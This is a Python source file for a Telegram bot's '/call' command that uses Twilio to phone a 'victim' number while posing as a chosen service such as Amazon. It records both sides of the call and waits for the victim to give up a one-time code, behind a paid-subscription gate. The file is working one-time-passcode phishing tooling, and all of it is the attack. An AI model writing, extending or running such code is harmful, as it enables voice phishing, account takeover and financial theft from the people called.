from telebot.types import Message
from twilio.rest import Client
from datetime import datetime
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, TWILIO_APP_URL
from database import get_connection, check_subscription, ADMIN_IDS

# Initialize Twilio Client
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: 
        twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: 
        pass

@bot.message_handler(commands=['call'])
def handle_call(message: Message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # 1. SECURITY CHECK
    # Admins bypass checks. Users need subscription.
    if user_id not in ADMIN_IDS:
        if not check_subscription(user_id):
            return bot.reply_to(message, "💎 **Premium Feature:** Access denied. Buy a plan at /start.")
    
    # 2. TWILIO CHECK
    if not twilio_client: 
        return bot.reply_to(message, "❌ **System Error:** Twilio is not configured.")
    
    # 3. FORMAT CHECK
    args = message.text.split()
    if len(args) < 3: 
        return bot.reply_to(message, "⚠️ **Usage:** `/call [number] [service]`\n\nExample: `/call +13055550100 Amazon`", parse_mode="Markdown")
    
    target = args[1]
    service = " ".join(args[2:])
    
    # 4. EXECUTE CALL
    try:
        msg = bot.reply_to(message, f"🔄 **Connecting to {service}...**", parse_mode="Markdown")
        
        twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}"
        
        # Callback para cuando termine la llamada (y recibir la grabación)
        status_callback_url = f"{TWILIO_APP_URL}/twilio/status?user_id={user_id}"

        call = twilio_client.calls.create(
            to=target, 
            from_=TWILIO_NUMBER, 
            url=twiml_url, 
            method='POST',
            record=True, # <--- 🔴 ESTO ACTIVA LA GRABACIÓN
            recording_channels='dual', # Graba a ambos lados
            status_callback=status_callback_url, 
            status_callback_event=['completed']
        )
        
        bot.edit_message_text(
            f"📞 **Calling Victim...**\n\n🎯 Target: `{target}`\n🏢 Service: `{service}`\n🔴 **Recording:** ON\n\n_⚠️ Waiting for code..._", 
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
        
    except Exception as e:
        error_msg = str(e)
        if "unverified" in error_msg.lower():
            bot.reply_to(message, "❌ **Twilio Trial Error:** Verify the number first.")
        else:
            bot.reply_to(message, f"❌ **Call Failed:** `{error_msg}`", parse_mode="Markdown")
